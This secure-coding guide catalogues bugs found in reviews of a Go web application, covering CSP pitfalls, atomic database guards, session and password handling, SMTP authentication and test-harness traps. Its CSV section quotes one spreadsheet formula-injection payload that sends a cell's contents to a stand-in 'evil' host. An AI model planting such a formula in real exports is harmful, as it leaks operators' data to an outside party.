# What reviews keep finding

A catalogue of real bugs found by reviewing each phase of a real project built in
this style — not hypotheticals. Every one passed `go build`, `go vet`, `gofmt` and
a full green test suite. Several returned HTTP 200.

**Review every phase before moving on.** In seven phases, every single review pass
found something, and two of them found a shipped feature that did not work at all.
A phase is not done when the tests pass; it is done when someone has looked for the
class of bug the tests structurally cannot see.

**Two of the sections below are only reachable with a browser** (the CSP ones), and "is
this still referenced" is only reliably answered by the LSP. Drive the UI with the Chrome
DevTools MCP server and query symbols with the LSP tool — see "Tools" at the top of
`SKILL.md`.

---

## The invisible ones: green tests, broken product

### ⚠️ CSP blocks inline event handlers, not just inline styles

The house rule is "zero `style="…"` in served templates" so `style-src` can stay
`'self'`. **The same applies to `on*=` attributes and `script-src`.** A filter
wired as:

```html
<select name="location" onchange="this.form.submit()">
```

does **nothing** under `script-src 'self'` with no `'unsafe-inline'`. The browser
refuses to run it. The page renders, returns 200, and every handler-level test
passes — because handler tests never execute JavaScript. Two separate list pages
shipped this way and neither filter had ever worked.

The fix is not `'unsafe-hashes'`. Use a real submit button, which needs no
JavaScript at all:

```html
<button type="submit">Filter</button>
```

Enforce it: a test that asserts no served page contains `onchange=` (or any `on*=`)
and that each filter form has a submit button. And **check admin UI in a browser** —
this is the canonical example of what the suite cannot reach.

### ⚠️ htmx's indicator styles fail *open* under a strict CSP

htmx injects its `.htmx-indicator` rules as a `<style>` block. `style-src 'self'`
blocks it silently, and the rule that *hides* an indicator is the one lost — so a
spinner sits permanently visible. Set `includeIndicatorStyles:false` in the
`htmx-config` meta tag and put the three rules in your stylesheet. Keep both or
drop both.

While there: htmx does not swap 4xx/5xx by default, so a server's refusal (a
declined delete, a validation failure) is swallowed and the page looks like nothing
happened. Configure `responseHandling` to swap error codes.

### ⚠️ CSP source paths are exact matches, not prefixes

A source not ending in `/` matches that literal path only. Listing a bucket base
URL in `img-src` refuses every object beneath it. Invisible to `curl` and to the
markup. Strip to scheme+host and regression-test it.

---

## Data integrity

### Check-then-write is not atomic — and it keeps coming back

This was found in three separate phases, twice *after* being written down:

- a create path using `Upsert`, silently overwriting someone else's row;
- a duplicate check racing the insert that followed it;
- a "refuse to disable the last admin" guard that counted, then updated — two
  admins disabling each other concurrently each saw "2 enabled", each passed, and
  between them locked everyone out.

**Every guard is one statement.** `INSERT … ON CONFLICT DO NOTHING` +
`RowsAffected`, or the count as a subquery in the `UPDATE`'s `WHERE`. See
`sqlite.md` for the shapes. Being able to recite the rule is not the same as
applying it to the function you are writing.

### A list and its count must read the same rows

`List` used `JOIN groups` while `Count` read the base table alone. An orphaned row
would vanish from the page and from the CSV export while still inflating the total,
so the page would claim more rows than it showed. `LEFT JOIN` with a `COALESCE`
fallback keeps the two in agreement. A foreign key making orphans "impossible"
today is not a reason for the two queries to disagree.

### Validating an identifier is not normalising it

`mail.ParseAddress` accepts RFC 5322's display-name form, so
`Alex <alex@example.com>` validates. Stored raw, it becomes a **second account for
one mailbox**: it does not collide with the plain address under a
`UNIQUE COLLATE NOCASE` index, so the uniqueness guard never fires — and it can
never sign in, because the login form's `type=email` input will not accept the
string back. Store `addr.Address`.

Generalise: **anything that becomes an identity needs validating *and* normalising**,
and the normalisation has to match how every read path matches.

### An export must not overwrite the only copy

`os.Create` truncates before the export runs. Combined with a driver that creates
an empty database for a missing path, a wrong `DB_PATH` overwrites a real data file
with `null` and reports success. Render to a buffer, refuse an empty export over an
existing file, `os.Rename` into place. See `sqlite.md`.

---

## HTTP surface

### Buffer a download before writing headers

Setting headers and then streaming means a mid-export failure has already committed
a 200. The operator gets a truncated or zero-byte file that looks exactly like a
good backup — a backup that fails silently is worse than one that fails loudly.
Buffer, then write headers, then copy. The same reasoning as rendering a template
into a buffer so a template error can still be a 500.

### Rate-limit every endpoint that verifies a password — not just login

A "change my password" form that requires the current password is a **guessing
oracle** with a distinct wrong-password response, and it is exactly the control
that stops a stolen session becoming a permanent account takeover. Unlimited, it is
also a memory lever: argon2id at real cost is ~64 MiB per attempt.

Put it behind the same limiter as the login POST. Note the login limiter's tight
tier should *not* be keyed on a cookie — an attacker discards that for free before
a login attempt — so key the tight tier on something they cannot drop, with a
looser per-IP ceiling behind it.

### Parse a state change strictly; absent must not mean permissive

```go
disable := r.PostFormValue("disabled") == "1"   // wrong
```

Any other value — including an absent field — reads as "enable". A POST with a
valid CSRF token and an empty body silently re-enabled a disabled account and
reported "Saved." Disabling was the guarded direction; enabling was not. Require an
explicit `"0"` or `"1"` and 400 on anything else.

### Escape a redirect built from data

Real location names contain spaces (`Durban North`). Concatenating one into a
`Location` header breaks it. `url.Values{...}.Encode()`.

---

## Exports of user-supplied text

### ⚠️ CSV is a code-execution path

Excel and Sheets evaluate a cell beginning `=`, `+`, `-` or `@`. A name or message
typed into a public, unauthenticated form therefore becomes a live formula the
moment an operator opens the export on a staff machine:

```
=HYPERLINK("http://evil/?"&A1,"click")
```

Prefix such values with an apostrophe. Route **every** text cell through one helper
so a column added later cannot slip past the escaping.

Note `+` is the realistic trigger, not the malicious one: `+27…` phone numbers hit
it constantly, which is also how you get a test that fails for a mundane reason.

---

## Templates and route wiring

### One parsed template set per page

If every page defines `content`, a single flat `ParseFS` set lets the **last file
parsed silently win** — pages render as each other. Parse one set per page
(partials + that page's layout + that page), keyed by filename. A page defining no
`content` should be a *startup* failure, not an empty page discovered later.

### Choose the layout by directory, not by a flag

A page rendered to someone with no session (the login form) needs a layout with no
sign-out button *in scope* — not a conditional inside the normal layout. Structural
beats remembering.

### Derive the protected-route list; never hand-maintain it

Register admin routes through a closure that records each one, and have a test
enumerate them and assert every one refuses an anonymous request. A hand-written
second list fails silently in exactly the case the test exists to catch.

Two details that matter:

- **Record the method.** A POST-registered route answers a GET with 405 *before*
  any middleware runs, so a GET-only enumeration reports it as "protected" while
  never having exercised its protection.
- **Pin the direct `mux.Handle` lines by source text** in a test. Routes mounted
  outside the closure are both unprotected and invisible to the enumeration; an
  allowlist of the legitimate few (assets, login, logout) turns a fifth into a
  test failure. This caught a genuinely new mounting path immediately.

### Notices come from a fixed code map

`?notice=saved` → a lookup in a `map[string]string`. Never render the query
parameter. There is no convenience in echoing it worth a reflected-content hole.

### No admin page may share a basename with a public fragment

Two template sets, one namespace of names, silent collision.

---

## Auth specifics

### Sessions: a database table, or a signed cookie?

`gorilla/securecookie` exists to make a *self-describing* cookie unforgeable
without server state. That is the wrong shape as soon as you need named accounts,
per-user disable, or "changing a password ends existing sessions" — each of those
requires a lookup on every request anyway, so the table is not the cost, it is the
mechanism. An opaque random token (`crypto/rand`) stored as its `sha256` is then
the whole design: nothing to forge, no MAC, no key rotation runbook.

Use securecookie when the cookie genuinely must carry claims and there is no
revocation requirement. Otherwise the table.

### The admin session cookie ignores the public `SameSite` setting

A `COOKIE_SAMESITE` variable exists so a *public* embedded form can be genuinely
cross-site. An admin credential must never follow it to `SameSite=None`, which
would let any site make the browser send it. Hard-code `Lax` for the admin cookie
and comment why.

### Make a failed login cost the same as a missing account

Verify against a dummy hash when the email is unknown, and treat a disabled account
identically to a wrong password. Otherwise response time and message between them
tell an attacker which addresses have accounts. Check `disabled` *after* the
password, or the account state becomes an oracle for the password being right.

### Password policy: length only

No composition rules — they push people towards short mangled words while argon2id
already makes offline guessing expensive. A 12-character minimum admits a
passphrase, which is what you would rather they chose.

**And enforce it on every path.** A documented minimum was implemented in the web
forms but not in the CLI that creates the *first* and most privileged account. A
doc claim added in the same commit as the code it describes still needs checking
against every path.

---

## Mail

### Only pass an `smtp.Auth` when credentials exist

```go
auth := smtp.PlainAuth("", s.User, s.Pass, s.Host)   // wrong
```

`smtp.PlainAuth` returns a **non-nil** `Auth` even for an empty user, and
`smtp.SendMail` hard-fails with `server doesn't support AUTH` whenever it holds a
non-nil `Auth` and the server advertises no AUTH extension. That is mailpit — so
local development, exactly as documented in the README, could never send mail.

```go
var auth smtp.Auth
if s.User != "" {
	auth = smtp.PlainAuth("", s.User, s.Pass, s.Host)
}
```

It survived because the transport had **no test at all** — only the header-sanitising
helper beside it did. Test the thing that talks to the network: a fake SMTP server
in-process, runnable with *and without* the AUTH extension, is ~80 lines and pins
the credential-less path, the authenticated path, and bcc staying out of the
headers. (Reply `235` to `AUTH`, not `250`, or the client rejects it.)

### Persist before sending, always

Write the submission, then attempt the mail, then flag it as sent. A delivery
failure must never lose a submission. Surface `email_sent = 0` as a filter *and* a
count on the index — it is the operationally interesting row: captured, never
delivered, and the visitor believes it was sent.

This invariant pays for itself the first time delivery breaks. When the SMTP bug
above hit, every submission was still in the database with `email_sent = 0`.

---

## Test-harness traps

- **A signed-in POST test cannot scrape a CSRF token from the login form** — that
  page redirects once a session exists, so the scrape returns nothing. Pass the
  token the sign-in helper returns.
- **Emulate a browser's origin headers.** nosurf checks `Sec-Fetch-Site`, `Origin`
  and `Referer` as well as the token; a test sending none is not emulating a form
  post. On plain HTTP, `SetIsTLSFunc` must say so or every post looks cross-origin.
- **Kill stale servers and pick a fresh port.** A `go run` left over from an
  earlier check, still answering on the same port, produced a confident false
  reading twice. The giveaway is a response that does not match what the code
  should do. `pgrep -af <binary>` first.
- **Use cheap argon2 parameters in tests** (`sync.OnceValue` the hash) — real ones
  cost ~100ms and 64 MiB per verification.
- **Assert a minimum count in any "every X must Y" test**, or it passes vacuously
  the day the fixture stops loading.
